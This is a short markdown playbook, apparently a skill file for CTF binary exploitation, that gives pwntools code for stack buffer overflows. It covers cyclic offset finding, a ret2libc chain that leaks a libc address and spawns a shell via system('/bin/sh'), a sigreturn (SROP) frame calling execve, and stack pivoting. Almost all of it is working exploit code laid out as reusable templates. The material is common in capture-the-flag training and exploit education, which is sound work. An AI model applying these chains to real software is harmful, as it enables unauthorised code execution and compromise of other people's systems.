# Stack Exploitation Playbook (skills/pwn/stack-pwn.md)

## 1. Vulnerability Assessment & Offset Finding

1. **Calculate Buffer Offset with Cyclic Pattern**:
   ```python
   from pwn import *
   p = process('./vuln')
   p.sendline(cyclic(256))
   p.wait()
   core = p.corefile
   offset = cyclic_find(core.fault_addr) # 32-bit: eip, 64-bit: rsp/rbp
   log.success(f"Overflow offset: {offset}")
   ```

2. **Stack Alignment Rule (x86_64)**:
   - In 64-bit binaries calling `system()` or `do_system()`, stack must be **16-byte aligned** (`RSP % 16 == 0`).
   - If payload crashes inside `system()` at `movaps` instruction, prepend a single `ret` gadget before `pop rdi; ret`.

---

## 2. Common Exploit Chains

### 2.1 Ret2Libc (64-bit)
```python
# Step 1: Leak GOT Address (e.g. puts@got)
pop_rdi = elf.search(asm('pop rdi; ret')).__next__()
ret = elf.search(asm('ret')).__next__()

payload1 = flat({
    offset: [
        pop_rdi,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'] # Loop back to main
    ]
})
io.sendlineafter(b'> ', payload1)
leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.sym['puts']
log.success(f"Libc Base: {hex(libc.address)}")

# Step 2: Spawn Shell
payload2 = flat({
    offset: [
        ret, # Stack alignment
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system']
    ]
})
io.sendlineafter(b'> ', payload2)
io.interactive()
```

### 2.2 Sigreturn Oriented Programming (SROP)
- When few ROP gadgets exist, call `sigreturn` syscall (`rax = 15` on x86_64, `eax = 119` on x86) to restore all registers from an injected `SigreturnFrame`.

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = flat({
    offset: [
        pop_rax_15_ret,
        syscall_ret,
        bytes(frame)
    ]
})
```

### 2.3 Stack Pivoting
- When stack space is constrained, pivot `RSP` into BSS or heap:
```python
# Payload pivots RSP to target_buffer
payload = flat({
    offset - 8: target_buffer, # Overwrite saved RBP
    offset: leave_ret          # mov rsp, rbp; pop rbp; ret
})
```
